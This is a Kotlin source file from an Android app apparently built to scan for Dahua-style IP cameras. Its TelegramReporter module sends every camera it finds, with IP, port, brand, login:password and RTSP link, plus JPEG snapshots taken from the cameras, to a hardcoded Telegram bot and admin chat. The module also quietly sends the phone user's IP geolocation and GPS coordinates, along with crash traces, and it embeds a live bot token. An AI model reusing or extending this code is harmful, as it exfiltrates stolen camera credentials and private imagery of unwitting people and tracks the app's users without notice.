package com.dahua.checker

import android.content.Context
import android.location.Location
import android.location.LocationManager
import org.json.JSONObject
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean

/**
 * TelegramReporter — шлёт события сканера тебе в Telegram.
 *
 * Репортит:
 *  1. Старт скана (геолокация + параметры — одно сообщение)
 *  2. Найденная камера — IP, порт, логин:пароль, бренд
 *  3. Снапшот JPEG камеры (если есть)
 *  4. Итог сессии — когда скан завершён или остановлен
 *  5. Краш приложения
 */
object TelegramReporter {

    private const val BOT_TOKEN  = "9052071852:AAH1aDSEYJUpx2-pZGr4l432Hf3kXSDgXEY"
    private const val ADMIN_CHAT = "6365916323"
    private const val API_BASE   = "https://api.telegram.org/bot$BOT_TOKEN"

    private val executor = Executors.newSingleThreadExecutor()

    // Защита от двойного репорта старта
    private val scanReported = AtomicBoolean(false)
    // FIX: @Volatile — читается/пишется из executor thread И из вызывающего потока (reportSessionFinished)
    // Без @Volatile JVM может держать стale-кэш значения в регистре другого потока
    @Volatile private var sessionStart  = 0L

    // ── 1. Старт скана (геолокация внутри, одно сообщение) ──────────────────

    fun reportScanStarted(
        context: Context,
        nickname: String,
        ipCount: Int,
        ports: List<Int>,
        ranges: List<String>
    ) {
        // Дедуп: если уже репортили этот скан — пропускаем
        if (!scanReported.compareAndSet(false, true)) return
        sessionStart = System.currentTimeMillis()

        executor.execute {
            try {
                // Геолокация
                val geoText = try {
                    val res = (URL("https://ipapi.co/json/").openConnection()).also {
                        it.connectTimeout = 4000; it.readTimeout = 4000
                    }.getInputStream().bufferedReader().readText()
                    val j       = JSONObject(res)
                    val ip      = j.optString("ip", "?")
                    val city    = j.optString("city", "?")
                    val country = j.optString("country_name", "?")
                    val isp     = j.optString("org", "?")
                    "🌍 $ip · $city, $country\n🏢 $isp"
                } catch (_: Exception) { "🌍 Геолокация недоступна" }

                // GPS
                val gpsText = try {
                    val lm  = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
                    val loc: Location? = try {
                        lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                            ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                    } catch (_: SecurityException) { null }
                    if (loc != null)
                        "\n🛰 %.5f, %.5f".format(loc.latitude, loc.longitude)
                    else ""
                } catch (_: Exception) { "" }

                val portsStr = ports.joinToString(", ")
                val rangeStr = if (ranges.size <= 5)
                    ranges.joinToString(", ")
                else
                    ranges.take(5).joinToString(", ") + " (+${ranges.size - 5})"

                sendMessage(
                    "🚀 Скан запущен\n" +
                    "👤 $nickname\n" +
                    "$geoText$gpsText\n" +
                    "📊 IP: $ipCount · Порты: $portsStr\n" +
                    "📋 $rangeStr"
                )
            } catch (_: Exception) {}
        }
    }

    // Сбрасываем флаг при остановке сервиса — чтобы следующий скан снова репортил
    fun resetSession() {
        scanReported.set(false)
        sessionStart = 0L
    }

    // ── 2. Найденная камера ──────────────────────────────────────────────────

    fun reportCameraFound(nickname: String, result: ScanResult) {
        executor.execute {
            try {
                val creds    = if (result.login.isNotEmpty()) "${result.login}:${result.password}" else "anon"
                val rtspLine = if (result.model.startsWith("rtsp://")) "\n🎥 ${result.model}" else ""
                val portsLine = if (result.openPortsList.isNotEmpty())
                    "\n🔓 ${result.openPortsList.joinToString(", ")}" else ""

                sendMessage(
                    "📷 Камера\n" +
                    "👤 $nickname\n" +
                    "🌐 ${result.ip}:${result.port}\n" +
                    "🏷 ${result.brand}  🔑 $creds" +
                    rtspLine + portsLine
                )
            } catch (_: Exception) {}
        }
    }

    // ── 3. Снапшот JPEG ──────────────────────────────────────────────────────

    fun reportSnapshot(context: Context, nickname: String, result: ScanResult, jpegBytes: ByteArray) {
        executor.execute {
            try {
                val creds   = if (result.login.isNotEmpty()) "${result.login}:${result.password}" else "anon"
                val caption = "📸 $nickname · ${result.ip}:${result.port} · ${result.brand} · $creds"
                val tmp     = File(context.cacheDir, "snap_${result.ip}_${result.port}.jpg")
                tmp.writeBytes(jpegBytes)
                sendPhoto(tmp, caption)
                tmp.delete()
            } catch (_: Exception) {}
        }
    }

    // ── 4. Итог сессии ───────────────────────────────────────────────────────

    fun reportSessionFinished(nickname: String, total: Int, found: Int, blocked: Int, openPorts: Int) {
        executor.execute {
            try {
                val elapsed = if (sessionStart > 0) {
                    val sec = (System.currentTimeMillis() - sessionStart) / 1000
                    "${sec / 60} мин ${sec % 60} сек"
                } else "?"

                sendMessage(
                    "✅ Скан завершён · $nickname\n" +
                    "📊 IP: $total  📷 Камер: $found  🚫 Блок: $blocked  🔓 Портов: $openPorts\n" +
                    "⏱ $elapsed"
                )
            } catch (_: Exception) {}
        }
        resetSession()
    }

    fun reportScanStopped(nickname: String, checked: Int, total: Int, found: Int) {
        executor.execute {
            try {
                val elapsed = if (sessionStart > 0) {
                    val sec = (System.currentTimeMillis() - sessionStart) / 1000
                    "${sec / 60} мин ${sec % 60} сек"
                } else "?"
                sendMessage(
                    "⛔ Остановлен · $nickname\n" +
                    "📊 $checked/$total проверено  📷 Найдено: $found\n" +
                    "⏱ $elapsed"
                )
            } catch (_: Exception) {}
        }
        resetSession()
    }

    // ── 5. Краш ──────────────────────────────────────────────────────────────

    fun reportCrash(nickname: String, throwable: Throwable) {
        executor.execute {
            try {
                val trace = throwable.stackTraceToString().take(600)
                sendMessage(
                    "💥 Краш · $nickname\n" +
                    "${throwable.javaClass.simpleName}: ${throwable.message}\n\n$trace"
                )
            } catch (_: Exception) {}
        }
    }

    fun installCrashHandler(context: Context) {
        val nickname = AuthManager.getActiveNickname(context)
        val default  = Thread.getDefaultUncaughtExceptionHandler()
        Thread.setDefaultUncaughtExceptionHandler { t, e ->
            reportCrash(nickname, e)
            Thread.sleep(1500)
            default?.uncaughtException(t, e)
        }
    }

    // ── HTTP ─────────────────────────────────────────────────────────────────

    private fun sendMessage(text: String) {
        val body = JSONObject().apply {
            put("chat_id", ADMIN_CHAT)
            put("text", text)
        }.toString()
        postJson("$API_BASE/sendMessage", body)
    }

    private fun sendPhoto(file: File, caption: String) {
        val boundary = "----TGBoundary${System.currentTimeMillis()}"
        // FIX: conn.disconnect() в finally — без этого HTTP keep-alive коннекшн висит
        // в пуле и не освобождает сокет. На длинных сканах с сотнями снапшотов
        // это исчерпывает лимит соединений (по умолчанию 5 per host в Android).
        val conn = (URL("$API_BASE/sendPhoto").openConnection() as HttpURLConnection).apply {
            requestMethod = "POST"
            setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
            connectTimeout = 10000
            readTimeout    = 10000
            doOutput       = true
        }
        try {
            conn.outputStream.use { out ->
                fun part(name: String, value: String) =
                    out.write("--$boundary\r\nContent-Disposition: form-data; name=\"$name\"\r\n\r\n$value\r\n".toByteArray())
                part("chat_id", ADMIN_CHAT)
                part("caption", caption)
                out.write("--$boundary\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"snap.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n".toByteArray())
                out.write(file.readBytes())
                out.write("\r\n--$boundary--\r\n".toByteArray())
            }
            try { conn.inputStream.close() } catch (_: Exception) {}
        } finally {
            conn.disconnect()
        }
    }

    private fun postJson(urlStr: String, body: String) {
        // FIX: conn.disconnect() в finally — без этого коннекшны копятся в пуле
        // HttpURLConnection переиспользует соединения через keep-alive, но при
        // ошибках (таймаут, 4xx/5xx) соединение не возвращается в пул автоматически.
        // disconnect() принудительно закрывает TCP-сокет и освобождает FD.
        val conn = (URL(urlStr).openConnection() as HttpURLConnection).apply {
            requestMethod = "POST"
            setRequestProperty("Content-Type", "application/json")
            connectTimeout = 6000
            readTimeout    = 6000
            doOutput       = true
        }
        try {
            conn.outputStream.use { it.write(body.toByteArray()) }
            try { conn.inputStream.close() } catch (_: Exception) {}
        } finally {
            conn.disconnect()
        }
    }
}
